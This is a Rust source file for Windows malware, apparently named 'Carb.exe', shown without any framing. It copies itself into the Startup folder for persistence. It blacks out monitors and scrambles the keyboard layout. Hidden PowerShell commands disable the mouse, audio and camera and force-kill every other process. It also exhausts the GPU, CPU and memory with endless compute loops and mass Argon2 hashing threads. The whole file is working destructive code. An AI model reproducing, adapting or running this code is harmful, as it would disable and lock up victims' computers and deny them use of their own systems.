#![allow(non_snake_case)]

use argon2::{Algorithm, Argon2, Params, Version};
use rand::Rng;
use std::fs;
use std::mem;
use std::path::PathBuf;
use std::process::Command;
use std::thread;
use windows::core::PCWSTR;
use windows::Win32::Devices::Display::{
    GetNumberOfPhysicalMonitorsFromHMONITOR, GetPhysicalMonitorsFromHMONITOR,
    PHYSICAL_MONITOR, SetMonitorBrightness,
};
use windows::Win32::Foundation::{BOOL, LPARAM, RECT};
use windows::Win32::Graphics::Gdi::{
    EnumDisplayMonitors, GetMonitorInfoW, MonitorFromWindow, MONITORINFOEXW,
    MONITOR_DEFAULTTOPRIMARY, HDC, HMONITOR,
};
use windows::Win32::UI::Input::KeyboardAndMouse::{
    ActivateKeyboardLayout, LoadKeyboardLayoutW, KLF_ACTIVATE,
};
use windows::Win32::UI::TextServices::HKL;

fn persist() {
    if let Ok(exe) = std::env::current_exe() {
        if let Some(startup) = dirsStartup() {
            let _ = fs::create_dir_all(&startup);
            let dest = startup.join("Carb.exe");
            let _ = fs::copy(&exe, &dest);
        }
    }
}

fn dirsStartup() -> Option<PathBuf> {
    std::env::var("APPDATA")
        .ok()
        .map(|appdata| PathBuf::from(appdata).join(r"Microsoft\Windows\Start Menu\Programs\Startup"))
}

fn gpuStress() {
    let instance = wgpu::Instance::new(wgpu::InstanceDescriptor::default());
    let adapter = pollster::block_on(instance.request_adapter(&wgpu::RequestAdapterOptions {
        power_preference: wgpu::PowerPreference::HighPerformance,
        force_fallback_adapter: false,
        compatible_surface: None,
    }))
    .expect("No suitable GPU found!");
    let (device, queue) = pollster::block_on(adapter.request_device(&wgpu::DeviceDescriptor::default(), None))
        .expect("Failed to create GPU device");
    let size = 4_000_000u64;
    let buffer = device.create_buffer(&wgpu::BufferDescriptor {
        label: None,
        size,
        usage: wgpu::BufferUsages::STORAGE | wgpu::BufferUsages::COPY_SRC | wgpu::BufferUsages::COPY_DST,
        mapped_at_creation: false,
    });
    let shader = device.create_shader_module(wgpu::ShaderModuleDescriptor {
        label: None,
        source: wgpu::ShaderSource::Wgsl(include_str!("../shader.wgsl").into()),
    });
    let bindGroupLayout = device.create_bind_group_layout(&wgpu::BindGroupLayoutDescriptor {
        label: None,
        entries: &[wgpu::BindGroupLayoutEntry {
            binding: 0,
            visibility: wgpu::ShaderStages::COMPUTE,
            ty: wgpu::BindingType::Buffer {
                ty: wgpu::BufferBindingType::Storage { read_only: false },
                has_dynamic_offset: false,
                min_binding_size: None,
            },
            count: None,
        }],
    });
    let bindGroup = device.create_bind_group(&wgpu::BindGroupDescriptor {
        label: None,
        layout: &bindGroupLayout,
        entries: &[wgpu::BindGroupEntry {
            binding: 0,
            resource: buffer.as_entire_binding(),
        }],
    });
    let pipelineLayout = device.create_pipeline_layout(&wgpu::PipelineLayoutDescriptor {
        label: None,
        bind_group_layouts: &[&bindGroupLayout],
        push_constant_ranges: &[],
    });
    let computePipeline = device.create_compute_pipeline(&wgpu::ComputePipelineDescriptor {
        label: None,
        layout: Some(&pipelineLayout),
        module: &shader,
        entry_point: "mainKernel",
    });
    let workgroupCount = ((size / std::mem::size_of::<f32>() as u64) as u32 + 255) / 256;
    loop {
        let mut encoder = device.create_command_encoder(&wgpu::CommandEncoderDescriptor::default());
        {
            let mut pass = encoder.begin_compute_pass(&wgpu::ComputePassDescriptor::default());
            pass.set_pipeline(&computePipeline);
            pass.set_bind_group(0, &bindGroup, &[]);
            pass.dispatch_workgroups(workgroupCount, 1, 1);
        }
        queue.submit(Some(encoder.finish()));
    }
}

unsafe extern "system" fn monitorEnumProc(
    hmonitor: HMONITOR,
    _hdc: HDC,
    _rc: *mut RECT,
    _lparam: LPARAM,
) -> BOOL {
    let mut info: MONITORINFOEXW = mem::zeroed();
    info.monitorInfo.cbSize = mem::size_of::<MONITORINFOEXW>() as u32;
    if GetMonitorInfoW(hmonitor, &mut info as *mut _ as *mut _).as_bool() {
        if info.monitorInfo.dwFlags & 1 != 0 {
            let mut numPhysical: u32 = 0;
            if GetNumberOfPhysicalMonitorsFromHMONITOR(hmonitor, &mut numPhysical).is_ok() && numPhysical > 0 {
                let mut physical: Vec<PHYSICAL_MONITOR> = vec![mem::zeroed(); numPhysical as usize];
                if GetPhysicalMonitorsFromHMONITOR(hmonitor, &mut physical[..]).is_ok() {
                    for p in physical.iter() {
                        let _ = SetMonitorBrightness(p.hPhysicalMonitor, 0);
                    }
                }
            }
        }
    }
    BOOL(1)
}

fn setBrightnessZero() {
    unsafe {
        let _hmon = MonitorFromWindow(None, MONITOR_DEFAULTTOPRIMARY);
        let _ = EnumDisplayMonitors(None, None, Some(monitorEnumProc), LPARAM(0));
    }
}

fn messKeyboard() {
    unsafe {
        let layoutId: Vec<u16> = "00010409\0".encode_utf16().collect();
        let hkl: HKL = LoadKeyboardLayoutW(PCWSTR(layoutId.as_ptr()), KLF_ACTIVATE).unwrap_or_default();
        let _ = ActivateKeyboardLayout(hkl, KLF_ACTIVATE);
    }
}

fn disableMouse() {
    let _ = Command::new("powershell")
        .args(["-WindowStyle", "Hidden", "-Command", "Get-PnpDevice -FriendlyName '*mouse*' | Disable-PnpDevice -Confirm:$false"])
        .status();
}

fn disableAudio() {
    let _ = Command::new("powershell")
        .args(["-WindowStyle", "Hidden", "-Command", "Get-PnpDevice -FriendlyName '*audio*' | Disable-PnpDevice -Confirm:$false"])
        .status();
}

fn disableCamera() {
    let _ = Command::new("powershell")
        .args(["-WindowStyle", "Hidden", "-Command", "Get-PnpDevice -FriendlyName '*camera*' | Disable-PnpDevice -Confirm:$false"])
        .status();
}

fn killOtherProcesses() {
    let _ = Command::new("powershell")
        .args(["-WindowStyle", "Hidden", "-Command", "Get-Process | Where-Object {$_.Id -ne $pid} | Stop-Process -Force"])
        .status();
}

fn main() {
    persist();

    std::thread::spawn(gpuStress);
    setBrightnessZero();
    messKeyboard();
    disableMouse();
    disableAudio();
    disableCamera();
    killOtherProcesses();

    let mut rng = rand::thread_rng();
    let charset: Vec<u8> = (33u8..=126).collect();
    let password: Vec<u8> = (0..10_000_000).map(|_| charset[rng.gen_range(0..charset.len())]).collect();
    let salt: Vec<u8> = (0..10_000_000).map(|_| charset[rng.gen_range(0..charset.len())]).collect();

    let params = Params::new(102400, 3000, 3667, Some(64)).unwrap();

    for _ in 0..100000000000u64 {
        let pwd = password.clone();
        let slt = salt.clone();
        let paramsClone = params.clone();
        let _handle = thread::Builder::new()
            .stack_size(1024 * 1024)
            .spawn(move || {
                let argon2 = Argon2::new(Algorithm::Argon2id, Version::V0x13, paramsClone);
                loop {
                    let mut out = [0u8; 64];
                    let _ = argon2.hash_password_into(&pwd, &slt, &mut out);
                }
            })
            .unwrap();
    }
}
